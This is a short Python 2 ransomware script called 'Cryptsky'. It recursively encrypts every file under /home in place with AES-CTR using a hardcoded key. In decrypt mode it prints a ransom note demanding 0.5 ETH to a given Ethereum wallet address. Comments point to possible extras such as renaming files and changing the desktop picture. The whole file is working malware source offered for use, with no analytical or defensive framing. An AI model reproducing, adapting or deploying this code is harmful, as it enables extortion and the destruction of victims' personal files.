#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os

import discover
import modify

#  global variables
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = 'yellow submarine'


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print '''
*ULTRA YEET*
---------------
Your files have been encrypted. Pay a ransom of .5 ETH to 0x8dfaC9f5E011CD1Ce1d5b7537a1c6E9703902aCA
If you do not pay this ransom you're files will be lost >:3

Your decryption key will bee given to you once proof of payment is received

'''.format(HARDCODED_KEY)
        key = raw_input('Enter Your Key> ')

    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # change this to do what you want
    startdirs = ['/home']

    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

    if not decrypt:
        pass
         # post encrypt stuff
         # desktop picture
         # icon, etc

if __name__=="__main__":
    main()
